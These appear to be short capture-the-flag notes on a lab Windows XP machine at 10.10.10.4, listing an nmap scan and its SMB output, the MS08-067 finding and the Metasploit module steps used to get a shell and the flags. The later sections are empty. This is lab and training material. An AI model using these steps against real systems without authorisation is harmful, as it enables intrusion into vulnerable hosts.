**IPv4: 10.10.10.4**
## Enumeration/Scanning
sudo nmap -A -Pn -sS -oN legacy $IP

135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

MS08-067


## Exploitation
msfconsole
* windows/smb/ms08_067_netapi
* set RHOST and LHOST
* exploit

root in Administrator/Desktop/root.txt
user in john/Desktop/user.txt

## Privilege Escalation


## Post-exploitation

